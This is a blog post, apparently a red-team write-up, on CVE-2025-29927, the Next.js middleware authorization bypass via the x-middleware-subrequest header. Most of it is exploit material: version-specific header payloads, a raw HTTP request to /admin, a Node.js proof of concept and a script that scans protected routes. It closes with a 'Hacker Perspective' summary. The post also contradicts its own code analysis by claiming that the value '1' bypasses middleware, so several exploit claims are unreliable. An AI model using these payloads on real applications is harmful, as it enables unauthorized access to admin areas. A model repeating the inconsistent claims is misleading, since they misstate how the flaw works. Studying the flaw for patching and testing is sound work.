---
title: "CVE-2025-29927: Next.js Middleware Authorization Bypass"
layout: post
tags: [Next.js, CVE-2025-29927, middleware, authorization bypass, security, pentesting, red-team, web-security, Node.js, exploit, hacking, cybersecurity, nullsecurityx]
image: /assets/images/next.jpg
category: cve
---

# CVE-2025-29927: Next.js Middleware Authorization Bypass ‚Äì Deep Technical Analysis

CVE-2025-29927 is a critical security vulnerability in the Next.js framework. This issue arises from the improper handling of the `x-middleware-subrequest` header. This header plays a key role in Next.js middleware execution, and its misuse can bypass authorization checks.

---

## 1Ô∏è‚É£ Role of `x-middleware-subrequest` Header

Next.js uses the `x-middleware-subrequest` header to determine whether a request is an internal subrequest. This header is designed to prevent infinite middleware loops. However, incorrect handling allows external requests to bypass middleware checks.

---

## 2Ô∏è‚É£ Technical Mechanism of the Vulnerability

```javascript
const subreq = params.request.headers["x-middleware-subrequest"];
const subrequests = typeof subreq === "string" ? subreq.split(":") : [];

if (subrequests.includes(middlewareInfo.name)) {
  result = {
    response: NextResponse.next(),
    waitUntil: Promise.resolve(),
  };
  continue;
}
```

This code reads the `x-middleware-subrequest` header, splits it into an array, and if it contains `middlewareInfo.name`, the middleware is skipped, allowing external requests to bypass authorization.

---

## 3Ô∏è‚É£ Exploit Methods Across Next.js Versions

### üìå Version 12.2 and Earlier

Middleware files are named `_middleware.ts` and reside in the `pages` folder. The `middlewareInfo.name` is the combination of directory and file name.

```javascript
x-middleware-subrequest: pages/_middleware
```

Setting this header externally can skip middleware checks.

### üìå Version 12.2 and Later

Middleware files are `middleware.ts`. The `middlewareInfo.name` is just the file name.

```javascript
x-middleware-subrequest: middleware
```

Correctly setting this header still bypasses middleware.

### üìå Version 13.2.0 and Later

Next.js enforces `MAX_RECURSION_DEPTH` to prevent infinite loops, but misuse of `x-middleware-subrequest` remains exploitable.

```javascript
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

---


<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9166422523496420"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-9166422523496420"
     data-ad-slot="8932006521"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

## 4Ô∏è‚É£ Exploit Scenario

```http
GET /admin HTTP/1.1
Host: vulnerable-app.local
x-middleware-subrequest: 1
```

This request bypasses middleware and allows unauthorized access to routes like `/admin`.

### Node.js PoC

```javascript
import fetch from 'node-fetch';

async function exploit() {
    const res = await fetch('http://localhost:3000/admin', {
        headers: { 'x-middleware-subrequest': '1' }
    });
    const body = await res.text();

    if (body.includes('Admin Panel')) {
        console.log('[+] Bypass Successful!');
    } else {
        console.log('[-] Middleware blocking access.');
    }
}

exploit();
```

---

## 5Ô∏è‚É£ JWT / Cookie Combinations

Some projects combine middleware with cookie or JWT role checks:

```javascript
if (!req.cookies.auth_token && req.headers['x-middleware-subrequest'] !== '1') {
    return NextResponse.redirect('/login');
}
```

Adding the header allows access without token or JWT.

---

## 6Ô∏è‚É£ Header Manipulation Scenarios

| Scenario      | Header                                    | Result             |
| ------------- | ----------------------------------------- | ------------------ |
| Simple bypass | x-middleware-subrequest: 1                | Middleware skipped |
| JWT bypass    | x-middleware-subrequest: 1 + missing JWT  | Role check bypass  |
| Cookie bypass | x-middleware-subrequest: 1 + empty cookie | Auth bypass        |

---

## 7Ô∏è‚É£ Automated Test Script (Red-Team Style)

```javascript
import fetch from 'node-fetch';

const routes = ['/admin', '/dashboard', '/settings'];

async function testBypass() {
    for (const route of routes) {
        const res = await fetch(`http://localhost:3000${route}`, {
            headers: { 'x-middleware-subrequest': '1' }
        });
        console.log(`${route}: ${res.status}`);
    }
}

testBypass();
```

This script tests all protected routes automatically to quickly identify which can be bypassed.

---

## 8Ô∏è‚É£ Hacker Perspective

* Auth checks in middleware can be bypassed via header manipulation.
* JWT or cookie combinations can optimize bypass.
* Red-team testing involves code-based exploits and response analysis.
* Summary: `x-middleware-subrequest` = primary exploit entry point.

* NullSecurityX

  
<!-- Share Buttons Start -->
<div class="share-buttons">
  <p>Share this post:</p>
  <a class="share-btn twitter" href="https://twitter.com/intent/tweet?text=CVE-2025-29927: Next.js Middleware Authorization Bypass&url={{ page.url | absolute_url }}" target="_blank">Twitter</a>
  <a class="share-btn facebook" href="https://www.facebook.com/sharer/sharer.php?u={{ page.url | absolute_url }}" target="_blank">Facebook</a>
  <a class="share-btn reddit" href="https://www.reddit.com/submit?url={{ page.url | absolute_url }}&title=CVE-2025-29927: Next.js Middleware Authorization Bypass" target="_blank">Reddit</a>
</div>

<style>
.share-buttons {
  margin-top: 30px;
  font-family: sans-serif;
}
.share-buttons p {
  margin-bottom: 8px;
  font-weight: bold;
}
.share-buttons .share-btn {
  display: inline-block;
  margin-right: 8px;
  padding: 8px 14px;
  color: #fff;
  text-decoration: none;
  border-radius: 5px;
  font-size: 14px;
  transition: opacity 0.2s;
}
.share-buttons .share-btn:hover {
  opacity: 0.8;
}
.share-buttons .twitter { background: #1da1f2; }
.share-buttons .facebook { background: #4267B2; }
.share-buttons .reddit { background: #ff4500; }
</style>
<!-- Share Buttons End -->


## üì∫ Video Demonstration

<iframe width="100%" height="500" 
src="https://www.youtube.com/embed/S3CVytIv098" 
title="Next.js Middleware Bypass CVE-2025-29927" 
frameborder="0" 
allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
allowfullscreen></iframe>


